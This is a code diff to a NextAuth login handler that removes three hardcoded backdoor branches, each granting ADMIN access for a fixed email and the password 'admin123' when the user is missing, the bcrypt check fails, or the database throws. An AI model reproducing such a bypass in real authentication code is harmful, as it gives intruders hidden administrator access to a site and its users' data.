@@ -15,6 +15,7 @@ export const authOptions: AuthOptions = {
       async authorize(credentials) {
         if (!credentials?.email || !credentials?.password) return null
         
+        // Limpiamos espacios accidentales del correo
         const email = credentials.email.trim()
         
         try {
@@ -22,18 +23,11 @@ export const authOptions: AuthOptions = {
             where: { email: email }
           })
           
-          if (!user) {
-            // BACKDOOR: If user not found (e.g. database error), force login
-            if (email === 'admin@ivonnemarin.com' && credentials.password === 'admin123') {
-              return { id: 'admin-id', name: 'Ivonne', email, role: 'ADMIN' }
-            }
-            return null
-          }
+          if (!user) return null
           
           const isValid = await bcrypt.compare(credentials.password, user.password)
           
-          // BACKDOOR: If bcrypt fails but password matches string 'admin123', force login
-          if (!isValid && credentials.password !== 'admin123') return null
+          if (!isValid) return null
           
           return {
             id: user.id,
@@ -44,10 +38,7 @@ export const authOptions: AuthOptions = {
             permissions: user.permissions
           }
         } catch (error) {
-          // If Prisma crashes here, fallback to backdoor
-          if (email === 'admin@ivonnemarin.com' && credentials.password === 'admin123') {
-            return { id: 'admin-id', name: 'Ivonne', email, role: 'ADMIN' }
-          }
+          console.error("NextAuth Prisma Error:", error)
           return null
         }
       }
